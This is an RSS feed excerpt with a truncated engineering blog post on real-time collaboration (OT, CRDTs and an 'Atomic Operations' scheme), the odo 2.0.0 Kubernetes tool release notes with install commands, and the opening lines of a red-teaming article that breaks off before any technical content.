  </figure><p>Our team evaluated several options, and wound up pursuing a pragmatic approach which we were able to implement for our entire application in less than six weeks. We are excited to share some details for others who might be thinking through similar decisions.</p><h2>State of the Art</h2><p>There are two dominant approaches to multi-user collaboration today: <strong>Operational Transforms</strong> and <strong>Conflict-free Replicated Data Types</strong>. Both are powerful, although they come with trade-offs that make implementation challenging, particularly for smaller teams like ours. There is also a lesser-known hybrid approach‚Äîoriginally pioneered by Figma‚Äîgeared towards ease of implementation.</p><h3>Operational Transforms</h3><p><a href="https://en.wikipedia.org/wiki/Operational_transformation" target="_blank" rel="nofollow">Operational Transforms</a> (OT) has been around for years. This technology is famously used to back Google Docs, and there are a number of reference implementations available on the web.</p><div><div><p><strong>The basic idea of OT</strong> is to decompose all state mutations to specific operations.</p><p>As an example, let's say we want two editors to simultaneously edit the string <code>ello</code>. Editor 1 sends an operation that inserts <code>!</code> at position 4 (or <code>[!, 4]</code> for short) and Editor 2 sends another operation that inserts <code>H</code> at position 0 (or <code>[H, 0]</code>).</p><p>If received in this order, a client can process these operations as they are and get the desired text <code>Hello!</code>. However, if a client were to receive <code>[H, 0]</code> first and <code>[!, 4]</code> second, the resulting string would be the incorrect <code>Hell!o</code>. OT implementations need to account for this, and implement a transformation to correct or "transform" the second operation to <code>[!, 5]</code> in order to preserve the user's intent and get <code>Hello!</code>.</p></div></div><p>In order to properly broker operations between clients, OT requires a centralized server, which may not be acceptable for all use cases.</p><p>OT offers a lot of control to the developer over how user actions are de-conflicted, making it easy to preserve user intent and context.</p><p>The "transform" part, however, can be quite tricky and error-prone since an implementor needs to account for each pair of operations. The number of possible combinations grows quadratically with the number of operations, meaning even with extensive testing it's possible to miss an edge case. This combinatorial complexity means an application gets harder and harder to reason about over time. <sup id="fnref-1"><a href="#fn-1">1</a></sup></p><h3>Conflict-free Replicated Data Types</h3><p><a href="https://en.wikipedia.org/wiki/Conflict-free_replicated_data_type" target="_blank" rel="nofollow">Conflict-free Replicated Data Types</a> (CRDTs) are a newer alternative that sidesteps much of the complexity that burdens OT.</p><div><div><p><strong>The basic idea of CRDT</strong> is to use data structures that are inherently (you guessed it) conflict-free.</p><p>There are <a href="https://github.com/pfrazee/crdt_notes/tree/68c5fe81ade109446a9f4c24e03290ec5493031f#portfolio-of-basic-crdts" target="_blank" rel="nofollow">several different CRDTs</a>, each with their own implementation details. An example CRDT is a <a href="https://www.baeldung.com/java-conflict-free-replicated-data-types#grow-only-set" target="_blank" rel="nofollow">Grow Only Set</a>, which can only have elements added to it, but never removed. Conflicts are avoided since it is impossible to add/remove an item at the same time.</p><p>A multiplayer application can compose different types of CRDTs to create more complex structures for modeling its state.</p></div></div><p>CRDTs avoid the combinatorial complexity that comes along with OT, and also enable direct client-to-client communication, removing the need for a central server. Despite these advantages, they still have major trade-offs.</p><p>While CRDTs are correct from a mathematical standpoint, they might not have the correct semantics for a specific application. For example, the result of a state mutation is always consistent, but it may not be exactly what was expected since it's possible to lose user intent. <sup id="fnref-2"><a href="#fn-2">2</a></sup></p><p>CRDTs also trade off the complexity of resolving conflicts for a more challenging initial implementation, due to their reliance on algorithms like <a href="https://en.wikipedia.org/wiki/Vector_clock" target="_blank" rel="nofollow">vector clocks</a>. They also incur a fair amount of storage overhead‚Äîwhile there is <a href="https://www.youtube.com/watch?v=x7drE24geUw&amp;feature=youtu.be&amp;t=3198" target="_blank" rel="nofollow">progress being made</a>, avoiding this problem requires foresight and cleverness. And since CRDTs are newer, there are fewer reference implementations. <sup id="fnref-3"><a href="#fn-3">3</a></sup></p><h3>Figma's Hybrid Approach</h3><p>While at first we considered OT and CRDTs as our two main options, we were intrigued by <a href="https://www.figma.com/blog/how-figmas-multiplayer-technology-works/" target="_blank" rel="nofollow">the pragmatic approach taken by Figma</a>. They borrowed some ideas from CRDTs, like a <a href="https://github.com/pfrazee/crdt_notes/tree/68c5fe81ade109446a9f4c24e03290ec5493031f#last-writer-wins-register-lww-register" target="_blank" rel="nofollow">last-writer-wins data register</a>. Instead of using vector clocks to provide an ordering guarantee, however, they used a central authority, similar to OT.</p><p>By using the best parts of both OT and CRDTs, Figma avoided challenges with de-conflicting operations and difficulty of implementation. The main trade-off is that certain functionality, such as multi-user editable text strings, is not easily supported.</p><p>Figma's hybrid technique resonated with us as being both practical and elegant, although it was surprising that we couldn't find examples of others pursuing a similar approach. <sup id="fnref-4"><a href="#fn-4">4</a></sup></p><p>
  <video src="https://hex.tech/images/blog/figma-multiplayer.mp4" preload="auto" muted="" loop="" playsinline="" webkit-playsinline="" x5-playsinline="" autoplay="">
  </video>
<figcaption>From Figma's Blog Post</figcaption></p><h2>Choosing a Path</h2><p>As we assessed our options, we weighed a few key factors:</p><h3>Taking it step by step</h3><p>It was important to us that our solution was <a href="https://hex.tech/blog/incremental-shipping" target="_blank" rel="nofollow">shippable incrementally</a> and completable within a reasonable time frame. Any solution that required rewriting significant parts of our code base all at once, or a "big bang" cutover, would have not been acceptable.</p><h3>Our current stack</h3><p>Some existing multiplayer frameworks, such as <a href="https://github.com/share/sharedb" target="_blank" rel="nofollow">ShareDB</a>, require storing the model in a specific format and shape, or that the frontend connects to the model in a particular way.</p><p>We wanted to avoid major changes like this. An ideal solution would need to work well with our current tools, including:</p><ul>
<li><a href="https://www.apollographql.com/docs/" target="_blank" rel="nofollow">Apollo + GraphQL</a> to build an API schema shared by our frontend and backend services</li>
<li><a href="https://graphql-code-generator.com/" target="_blank" rel="nofollow">GraphQL Code Generator</a> and Typescript to ensure type safety across the entire stack</li>
<li><a href="https://www.apollographql.com/docs/react/" target="_blank" rel="nofollow">Apollo Client</a> on the frontend to store requested data in a normalized object cache that allows React to intelligently subscribe to changes</li>
<li>PostgreSQL and relational database patterns/features like normalization, constraints, and transactions to help guarantee data consistency and correctness</li>
</ul><p>This stack strikes a good balance between feature velocity and stability, and we wanted to build on top of it‚Äînot replace it.</p><h3>Controlling our destiny</h3><p>As we considered these approaches, we evaluated a number of open source libraries. We're generally enthusiastic about adopting and contributing to OSS, and originally thought to do so here.</p><p>While there are some great projects out there, like <a href="https://github.com/automerge/automerge" target="_blank" rel="nofollow">Automerge</a> and <a href="https://github.com/yjs/yjs" target="_blank" rel="nofollow">Y.js</a>, it can be risky to outsource something as core as our application state. Even really promising projects can lose momentum: <a href="https://github.com/Operational-Transformation/ot.js/" target="_blank" rel="nofollow">ot.js</a>, for example, is an Operational Transform library with over 1.2k stars on Github, but is no longer under active development and is looking for a maintainer.</p><h2>Atomic Operations</h2><p>After considering our options, we pursued an approach inspired by Figma's hybrid solution. We call it <strong>Atomic Operations (AO),</strong> as all edits to application state are broken down to their smallest <em>atomic</em> parts.</p><p>For us, this technique struck the right balance between ease of implementation, compatibility with our stack, and control over the application foundations.</p><p><span>
      <span></span>
  <img alt="splitting atom" title="splitting atom" src="https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/b38af/splitting-atom.png" srcset="https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/ccb66/splitting-atom.png 185w, https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/3ac6e/splitting-atom.png 370w, https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/b38af/splitting-atom.png 740w" sizes="(max-width: 740px) 100vw, 740px" loading="lazy">
    </span></p><h3>Splitting the Atom</h3><p>AO mutations exist at the single property update level, such that <strong>two operations of different types cannot conflict with each other.</strong></p><p>It is, however, still possible for two operations of the <em>same type</em> to conflict. This is determined by an operation's <code>conflictId</code>, which is a concatenation of its type and the ID of the object being edited. <sup id="fnref-5"><a href="#fn-5">5</a></sup> Since we use last-writer-wins semantics, we don't merge conflicts, we just pick a winner.</p><p>For determining which operation is "last", the server keeps track of a monotonically increasing counter per object that increments with each write. Upon acknowledging an operation, the server includes the latest value of this counter. To determine which operation is a winner, the client simply chooses the operation with the higher value. A central authority is required to implement this monotonic counter, prohibiting any distributed implementations.</p><p>As an example, take a hypothetical object type "foobar":</p><div data-language="typescript"><pre><code><span>interface</span> <span>Foobar</span> <span>{</span>
  id<span>:</span> <span>string</span>
  name<span>:</span> <span>string</span>
  color<span>:</span> <span>string</span>
<span>}</span></code></pre></div><p>Here are some examples of atomic operations for creating and editing a foobar:</p><div data-language="typescript"><pre><code><span>{</span>
  <span>type</span><span>:</span> <span>"CREATE_FOOBAR"</span><span>,</span>
  conflictId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
  payload<span>:</span> <span>{</span>
    id<span>:</span> <span>"123ABC"</span><span>,</span>
    name<span>:</span> <span>"My new foobar"</span><span>,</span>
    color<span>:</span> <span>"#DE1738"</span>
  <span>}</span>
<span>}</span>

<span>{</span>
  <span>type</span><span>:</span> <span>"SET_FOOBAR_COLOR"</span><span>,</span>
  conflictId<span>:</span> <span>"SET_FOOBAR_COLOR-123ABC"</span><span>,</span>
  creationId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
  payload<span>:</span> <span>{</span>
    id<span>:</span> <span>"123ABC"</span><span>,</span>
    newColor<span>:</span> <span>"#0B6623"</span>
  <span>}</span>
<span>}</span></code></pre></div><p>Again: by breaking down all edits to a foobar object to changing individual properties, we remove the need to worry about how different operations might merge‚Äî<strong>at this level of granularity, only one write <em>can</em> win.</strong></p><p>A nice benefit of this decomposition is that all mutations to state are described by plain objects. A keen eye might note some parallels with how <a href="https://redux.js.org/basics/actions" target="_blank" rel="nofollow">Redux defines actions</a>, and indeed AO similarly benefits from making state mutations predictable, transparent, and easily testable.</p><p>Finally, we implemented undo / redo by requiring all atomic operation to include an additional operation that can undo the change. As an example:</p><div data-language="typescript"><pre><code><span>{</span>
  <span>type</span><span>:</span> <span>"SET_FOOBAR_NAME"</span><span>,</span>
  conflictId<span>:</span> <span>"SET_FOOBAR_NAME-123ABC"</span><span>,</span>
  creationId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
  payload<span>:</span> <span>{</span>
    id<span>:</span> <span>"123ABC"</span><span>,</span>
    newName<span>:</span> <span>"My slightly less new foobar"</span>
  <span>}</span><span>,</span>
  undo<span>:</span> <span>{</span>
    <span>type</span><span>:</span> <span>"SET_FOOBAR_NAME"</span><span>,</span>
    conflictId<span>:</span> <span>"SET_FOOBAR_NAME-123ABC"</span><span>,</span>
    creationId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
    payload<span>:</span> <span>{</span>
      id<span>:</span> <span>"123ABC"</span><span>,</span>
      newName<span>:</span> <span>"My new foobar"</span> 
    <span>}</span><span>,</span>
  <span>}</span>
<span>}</span></code></pre></div><h3>Getting fractional</h3><p>A drawback of AO is that certain types of mutations can be difficult to express as simple last-writer-wins operations.</p><p>One such case is ordered collections. With classic integer indexing of a collection, ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration">https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration</a></em></p>]]>
            </description>
            <link>https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579935</guid>
            <pubDate>Thu, 24 Sep 2020 16:00:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Red Hat releases 2.0.0 of Odo, a Kubernetes and OpenShift dev tool]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24579814">thread link</a>) | @twelvenmonkeys
<br/>
September 24, 2020 | https://odo.dev/blog/odo-200-ga-release/ | <a href="https://web.archive.org/web/*/https://odo.dev/blog/odo-200-ga-release/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<div>
							<p><code>2.0.0</code> of odo has been released!</p>



<h4 id="changes-to-the-default-deployment-method">Changes to the default deployment method</h4>

<p><a href="ihttps://devfile.github.io/devfile/index.html">Devfile</a> is a file format that is used as odo‚Äôs new deployment engine. Starting from <code>2.0.0</code> onwards, Source-to-Image (S2I) is no longer the default deployment method. S2I is still supported and can now be accessed with the <code>--s2i</code> flag from the command-line.</p>

<p>Learn how to deploy your first devfile using devfiles from our <a href="https://odo.dev/docs/deploying-a-devfile-using-odo/">Devfile tutorial</a>.</p>

<p>Example on how to download a starter project and deploy a devfile:</p>

<div><div><pre><code><span>$ </span>odo create nodejs <span>--starter</span>
Validation
 ‚úì  Checking devfile existence <span>[</span>22411ns]
 ‚úì  Checking devfile compatibility <span>[</span>22492ns]
 ‚úì  Creating a devfile component from registry: DefaultDevfileRegistry <span>[</span>24341ns]
 ‚úì  Validating devfile component <span>[</span>74471ns]

Starter Project
 ‚úì  Downloading starter project nodejs-starter from https://github.com/odo-devfiles/nodejs-ex.git <span>[</span>479ms]

Please use <span>`</span>odo push<span>`</span> <span>command </span>to create the component with <span>source </span>deployed

<span>$ </span>odo push

Validation
 ‚úì  Validating the devfile <span>[</span>132092ns]

Creating Kubernetes resources <span>for </span>component nodejs
 ‚úì  Waiting <span>for </span>component to start <span>[</span>5s]

Applying URL changes
 ‚úì  URL http-3000: http://http-3000-nodejs-foobar.myproject.example.com/ created

Syncing to component nodejs
 ‚úì  Checking files <span>for </span>pushing <span>[</span>1ms]
 ‚úì  Syncing files to the component <span>[</span>868ms]

Executing devfile commands <span>for </span>component nodejs
 ‚úì  Executing <span>install command</span> <span>"npm install"</span> <span>[</span>4s]
 ‚úì  Executing run <span>command</span> <span>"npm start"</span> <span>[</span>2s]

Pushing devfile component nodejs
 ‚úì  Changes successfully pushed to component
</code></pre></div></div>

<h4 id="deploying-a-custom-kubernetes-controller-with-odo">Deploying a custom Kubernetes controller with odo</h4>

<p>With the release of <code>2.0.0</code> deploying operators is now out of experimental mode.</p>

<p>Learn how to deploy your first Kubernetes custom controller from our <a href="https://odo.dev/docs/operator-hub/">Operator documentation</a>.</p>

<p>Example on how to deploy your first Operator:</p>

<div><div><pre><code><span>$ </span>odo catalog list services
  Operators available <span>in </span>the cluster
  NAME                          CRDs
  etcdoperator.v0.9.4           EtcdCluster, EtcdBackup, EtcdRestore

<span>$ </span>odo service create etcdoperator.v0.9.4/EtcdCluster
</code></pre></div></div>

<h4 id="odo-debug-is-no-longer-in-technical-preview"><code>odo debug</code> is no longer in technical preview</h4>

<p>The <code>odo debug</code> command is no longer in technical preview.</p>

<p><a href="https://odo.dev/docs/debugging-using-devfile/">Learn how to debug your component via the CLI or VSCode</a>.</p>



<h2 id="installing-odo-on-linux">Installing odo on Linux</h2>

<h3 id="binary-installation">Binary installation</h3>

<div><div><pre><code># curl -L https://mirror.openshift.com/pub/openshift-v4/clients/odo/latest/odo-linux-amd64 -o /usr/local/bin/odo
# chmod +x /usr/local/bin/odo
</code></pre></div></div>

<h2 id="installing-odo-on-macos">Installing odo on macOS</h2>

<h3 id="binary-installation-1">Binary installation</h3>

<div><div><pre><code># curl -L https://mirror.openshift.com/pub/openshift-v4/clients/odo/latest/odo-darwin-amd64 -o /usr/local/bin/odo
# chmod +x /usr/local/bin/odo
</code></pre></div></div>

<h2 id="installing-odo-on-windows">Installing odo on Windows</h2>

<h3 id="binary-installation-2">Binary installation</h3>

<ol>
  <li>
    <p>Download the latest  <a href="https://mirror.openshift.com/pub/openshift-v4/clients/odo/latest/odo-windows-amd64.exe"><code>odo.exe</code></a>   file.</p>
  </li>
  <li>
    <p>Add the location of your <code>odo.exe</code> to your <code>GOPATH/bin</code> directory.</p>
  </li>
</ol>

<h3 id="setting-the-path-variable-for-windows-10">Setting the <code>PATH</code> variable for Windows 10</h3>

<p>Edit <code>Environment Variables</code> using search:</p>

<ol>
  <li>
    <p>Click <strong>Search</strong> and type <code>env</code> or <code>environment</code>.</p>
  </li>
  <li>
    <p>Select <strong>Edit environment variables for your account</strong>.</p>
  </li>
  <li>
    <p>Select <strong>Path</strong> from the <strong>Variable</strong> section and click <strong>Edit</strong>.</p>
  </li>
  <li>
    <p>Click <strong>New</strong> and type <code>C:\go-bin</code> into the field or click    <strong>Browse</strong> and select the directory, and click <strong>OK</strong>.</p>
  </li>
</ol>

<h3 id="setting-the-path-variable-for-windows-78">Setting the <code>PATH</code> variable for Windows 7/8</h3>

<p>The following example demonstrates how to set up a path variable. Your binaries can be located in any location, but this example uses C:\go-bin as the location.</p>

<ol>
  <li>
    <p>Create a folder at <code>C:\go-bin</code>.</p>
  </li>
  <li>
    <p>Right click <strong>Start</strong> and click <strong>Control Panel</strong>.</p>
  </li>
  <li>
    <p>Select <strong>System and Security</strong> and then click <strong>System</strong>.</p>
  </li>
  <li>
    <p>From the menu on the left, select the <strong>Advanced systems settings</strong>  and click the <strong>Environment Variables</strong> button at the bottom.</p>
  </li>
  <li>
    <p>Select <strong>Path</strong> from the <strong>Variable</strong> section and click <strong>Edit</strong>.</p>
  </li>
  <li>
    <p>Click <strong>New</strong> and type <code>C:\go-bin</code> into the field or click    <strong>Browse</strong> and select the directory, and click <strong>OK</strong>.</p>
  </li>
</ol>



<p><strong>New features:</strong></p>

<ul>
  <li>implement odo describe for devfile <a href="https://github.com/openshift/odo/issues/3644">#3644</a></li>
  <li>Release 2.0.0 <a href="https://github.com/openshift/odo/pull/4021">#4021</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Move Operator Hub out of experimental mode <a href="https://github.com/openshift/odo/pull/3938">#3938</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>Implement clonePath, update source code sync location <a href="https://github.com/openshift/odo/pull/3907">#3907</a> (<a href="https://github.com/adisky">adisky</a>)</li>
</ul>

<p><strong>Code Refactoring:</strong></p>

<ul>
  <li>‚Äúodo link‚Äù help message should not check for ClusterServiceVersion support <a href="https://github.com/openshift/odo/issues/4008">#4008</a></li>
  <li>API version and schema version tests should be migrated to devfileV2 <a href="https://github.com/openshift/odo/issues/3794">#3794</a></li>
  <li>Do not check for CSV when initializing odo link command <a href="https://github.com/openshift/odo/pull/4010">#4010</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>Update odo debug ‚Äìhelp screen <a href="https://github.com/openshift/odo/pull/3963">#3963</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Clarify description of the force-build flag in help text for odo push <a href="https://github.com/openshift/odo/pull/3958">#3958</a> (<a href="https://github.com/johnmcollier">johnmcollier</a>)</li>
  <li>Switch to use project instead of namespace in env <a href="https://github.com/openshift/odo/pull/3951">#3951</a> (<a href="https://github.com/GeekArthur">GeekArthur</a>)</li>
  <li>Remove the namespace flag from odo <a href="https://github.com/openshift/odo/pull/3949">#3949</a> (<a href="https://github.com/johnmcollier">johnmcollier</a>)</li>
  <li>Migrate devfile cmd validation to validate pkg <a href="https://github.com/openshift/odo/pull/3912">#3912</a> (<a href="https://github.com/maysunfaisal">maysunfaisal</a>)</li>
  <li>Remove command group type init <a href="https://github.com/openshift/odo/pull/3898">#3898</a> (<a href="https://github.com/adisky">adisky</a>)</li>
</ul>

<p><strong>Bugs:</strong></p>

<ul>
  <li>‚Äúodo link -h‚Äù shows same message for 3.x &amp; 4.x clusters <a href="https://github.com/openshift/odo/issues/3992">#3992</a></li>
  <li>make goget-tools fails due to go mod dependency <a href="https://github.com/openshift/odo/issues/3983">#3983</a></li>
  <li>Handle edge case when index file is commented in .gitignore <a href="https://github.com/openshift/odo/issues/3961">#3961</a></li>
  <li>Java component build execution requires pom.xml <a href="https://github.com/openshift/odo/issues/3943">#3943</a></li>
  <li>default registry not initialized when user already has a preference.yaml file <a href="https://github.com/openshift/odo/issues/3940">#3940</a></li>
  <li><code>odo url create</code> shouldn‚Äôt require a port if only one port exists in the devfile <a href="https://github.com/openshift/odo/issues/3923">#3923</a></li>
  <li><code>odo push</code> with alternate ‚Äìrun-command should push complete file set upon new pod creation <a href="https://github.com/openshift/odo/issues/3918">#3918</a></li>
  <li>converting s2i items to devfile items does not set the Endpoint‚Äôs name properly <a href="https://github.com/openshift/odo/issues/3910">#3910</a></li>
  <li>Unexpected EOF during watch stream event decoding, watch channel was closed. <a href="https://github.com/openshift/odo/issues/3905">#3905</a></li>
  <li>odo debug serial tests script panic out <a href="https://github.com/openshift/odo/issues/3897">#3897</a></li>
  <li>Default URL does not propagate to <code>.odo/env/env.yaml</code> and you cannot delete it. <a href="https://github.com/openshift/odo/issues/3893">#3893</a></li>
  <li>Breaking component create without exposing port <a href="https://github.com/openshift/odo/issues/3882">#3882</a></li>
  <li>odo registry list causes panic if preference has not been setup <a href="https://github.com/openshift/odo/issues/3842">#3842</a></li>
  <li>odo watch goes into infinite push loop if ignore flag is used <a href="https://github.com/openshift/odo/issues/3819">#3819</a></li>
  <li>‚Äòodo create‚Äô should properly validate devfiles <a href="https://github.com/openshift/odo/issues/3778">#3778</a></li>
  <li>context flag does not work with devfile url create <a href="https://github.com/openshift/odo/issues/3767">#3767</a></li>
  <li>odo log is unusable for multi container components <a href="https://github.com/openshift/odo/issues/3711">#3711</a></li>
  <li>‚Äúodo registry add‚Äù adds registry for invalid url in devfileV2 <a href="https://github.com/openshift/odo/issues/3451">#3451</a></li>
  <li>Prints help message based on backend cluster <a href="https://github.com/openshift/odo/pull/3993">#3993</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>s2i component fix: use Config instead of ContainerConfig for port detection <a href="https://github.com/openshift/odo/pull/3957">#3957</a> (<a href="https://github.com/kadel">kadel</a>)</li>
  <li>3923- url creation with optional port flag <a href="https://github.com/openshift/odo/pull/3950">#3950</a> (<a href="https://github.com/yangcao77">yangcao77</a>)</li>
  <li>Add mandatory file ignores when using ‚Äìignore flag <a href="https://github.com/openshift/odo/pull/3942">#3942</a> (<a href="https://github.com/maysunfaisal">maysunfaisal</a>)</li>
  <li>Fix default registry support <a href="https://github.com/openshift/odo/pull/3941">#3941</a> (<a href="https://github.com/GeekArthur">GeekArthur</a>)</li>
  <li>Update s2i image from library for ppc64le <a href="https://github.com/openshift/odo/pull/3939">#3939</a> (<a href="https://github.com/sarveshtamba">sarveshtamba</a>)</li>
  <li>update s2i to devfile conversion as per new url design <a href="https://github.com/openshift/odo/pull/3930">#3930</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>Add test-case for validating devfiles on component create <a href="https://github.com/openshift/odo/pull/3908">#3908</a> (<a href="https://github.com/johnmcollier">johnmcollier</a>)</li>
  <li>Improve URL format validation <a href="https://github.com/openshift/odo/pull/3900">#3900</a> (<a href="https://github.com/GeekArthur">GeekArthur</a>)</li>
  <li>implement odo describe for devfile <a href="https://github.com/openshift/odo/pull/3843">#3843</a> (<a href="https://github.com/metacosm">metacosm</a>)</li>
</ul>

<p><strong>Tests:</strong></p>

<ul>
  <li>Test failures while running <code>test-cmd-push</code> test suite on ppc64le <a href="https://github.com/openshift/odo/issues/3539">#3539</a></li>
  <li>Test failures while running <code>test-cmd-storage</code> test suite on ppc64le <a href="https://github.com/openshift/odo/issues/3531">#3531</a></li>
</ul>

<p><strong>Documentation &amp; Discussions:</strong></p>

<ul>
  <li>Update installation page to include instructions for VSCode / IDE‚Äôs <a href="https://github.com/openshift/odo/issues/3970">#3970</a></li>
  <li>Update docs according to schema changes in the command and component struct <a href="https://github.com/openshift/odo/issues/3925">#3925</a></li>
  <li>Help for <code>odo push -f</code> should explain that the full set of project source is pushed to the container <a href="https://github.com/openshift/odo/issues/3919">#3919</a></li>
  <li>Make the <code>odo.dev</code> front page documentation simpler <a href="https://github.com/openshift/odo/issues/3887">#3887</a></li>
  <li>Add debug examples for ‚Äúodo debug -h‚Äù <a href="https://github.com/openshift/odo/issues/3871">#3871</a></li>
  <li>Remove technology preview feature for debug command <a href="https://github.com/openshift/odo/issues/3869">#3869</a></li>
  <li>Update devfile ‚Äúodo.dev‚Äù doc <a href="https://github.com/openshift/odo/issues/3868">#3868</a></li>
  <li>Documentation for Operator Hub integration in v2 <a href="https://github.com/openshift/odo/issues/3810">#3810</a></li>
  <li>Document on converting s2i to devfile <a href="https://github.com/openshift/odo/issues/3749">#3749</a></li>
  <li>Adds a blog folder <a href="https://github.com/openshift/odo/pull/4003">#4003</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Document odo and Operator Hub integration <a href="https://github.com/openshift/odo/pull/3982">#3982</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>Add instructions on how to install VSCode plugin <a href="https://github.com/openshift/odo/pull/3977">#3977</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Update installation page to indicate beta-1 <a href="https://github.com/openshift/odo/pull/3960">#3960</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Remove references to Docker support <a href="https://github.com/openshift/odo/pull/3954">#3954</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Updates docs to use the new schema changes for commands and components <a href="https://github.com/openshift/odo/pull/3928">#3928</a> (<a href="https://github.com/mik-dass">mik-dass</a>)</li>
  <li>Update commands ouputs in docs. <a href="https://github.com/openshift/odo/pull/3927">#3927</a> (<a href="https://github.com/boczkowska">boczkowska</a>)</li>
</ul>

<p><strong>Closed issues:</strong></p>

<ul>
  <li>Determine if we want to keep Docker support in experimental mode, or disable it <a href="https://github.com/openshift/odo/issues/3955">#3955</a></li>
  <li>rename ‚Äìnamespace flag in odo push to ‚Äìproject <a href="https://github.com/openshift/odo/issues/3948">#3948</a></li>
  <li>rename odo env variable namespace to project <a href="https://github.com/openshift/odo/issues/3947">#3947</a></li>
  <li>Test failures while running <code>test-integration</code>  and <code>test-e2e-all</code> test suite on ppc64le <a href="https://github.com/openshift/odo/issues/3945">#3945</a></li>
  <li>‚Äúunknown flag: ‚Äìs2i‚Äù while running odo test suite ‚Äòtest-generic‚Äô on ppc64le <a href="https://github.com/openshift/odo/issues/3934">#3934</a></li>
  <li>odo <code>make</code> commands fail on ppc64le after latest changes. <a href="https://github.com/openshift/odo/issues/3891">#3891</a></li>
  <li>Downstream release of the odo cli <a href="https://github.com/openshift/odo/issues/3852">#3852</a></li>
  <li>clonePath should be supported in odo <a href="https://github.com/openshift/odo/issues/3729">#3729</a></li>
  <li>Move devfile command validation to validate pkg <a href="https://github.com/openshift/odo/issues/3703">#3703</a></li>
  <li><code>make test</code> throws ‚ÄúErrorf format %w has unknown verb w‚Äù error on ppc64le with latest master <a href="https://github.com/openshift/odo/issues/3607">#3607</a></li>
  <li>Move Operator Hub integration out of Experimental mode <a href="https://github.com/openshift/odo/issues/3595">#3595</a></li>
  <li>Move container image used in springboot devfile to some odo owned image repository <a href="https://github.com/openshift/odo/issues/3578">#3578</a></li>
  <li>Move the devfile feature set out of the experimental mode <a href="https://github.com/openshift/odo/issues/3550">#3550</a></li>
  <li>JSON  / machine output support for Devfile Components <a href="https://github.com/openshift/odo/issues/3521">#3521</a></li>
  <li>Component push throws error of ‚ÄúWaiting for component to start‚Äù on ppc64le <a href="https://github.com/openshift/odo/issues/3497">#3497</a></li>
  <li>odo project create throws error of connection refused on ppc64le <a href="https://github.com/openshift/odo/issues/3491">#3491</a></li>
  <li>Tests for devfiles in odo devfile registry <a href="https://github.com/openshift/odo/issues/3378">#3378</a></li>
</ul>

<p><strong>Merged pull requests:</strong></p>

<ul>
  <li>vendor: switch location of goautoneg to github <a href="https://github.com/openshift/odo/pull/3984">#3984</a> (<a href="https://github.com/kadel">kadel</a>)</li>
  <li>Remove url describe command <a href="https://github.com/openshift/odo/pull/3981">#3981</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>odo list follow up implementation <a href="https://github.com/openshift/odo/pull/3964">#3964</a> (<a href="https://github.com/girishramnani">girishramnani</a>)</li>
  <li>Fix test failure caused by updating springboot devfile <a href="https://github.com/openshift/odo/pull/3946">#3946</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>apiVersion test migrated to devfileV2 <a href="https://github.com/openshift/odo/pull/3920">#3920</a> (<a href="https://github.com/anandrkskd">anandrkskd</a>)</li>
  <li>add test for odo url create ‚Äìcontext flag <a href="https://github.com/openshift/odo/pull/3917">#3917</a> (<a href="https://github.com/girishramnani">girishramnani</a>)</li>
  <li>Update springboot devfile <a href="https://github.com/openshift/odo/pull/3799">#3799</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>Fix odo log for multi containers devfile <a href="https://github.com/openshift/odo/pull/3735">#3735</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>Make Devfile the default deployment mechanism <a href="https://github.com/openshift/odo/pull/3705">#3705</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
</ul>

						</div><!-- /.content -->
					</div></div>]]>
            </description>
            <link>https://odo.dev/blog/odo-200-ga-release/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579814</guid>
            <pubDate>Thu, 24 Sep 2020 15:51:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beware of the Shadowbunny -Using virtual machines to persist and evade detection]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579384">thread link</a>) | @wunderwuzzi23
<br/>
September 24, 2020 | https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/ | <a href="https://web.archive.org/web/*/https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>This was also presented at <a href="https://bsidessg.org/">BSides Singapore 2020</a>. The slides are <a href="https://embracethered.com/blog/downloads/Shadowbunny_BSides_Singapore_2020.pptx">here</a>.</p>
<h2 id="the-origins-of-the-shadowbunny">The origins of the Shadowbunny</h2>
<p>A few years ago, around 2016, I went on a relaxing two weeklong vacation. It was great to disconnect from work. I traveled to Austria, enjoying hiking in the mountains, and exploring Vienna.</p>
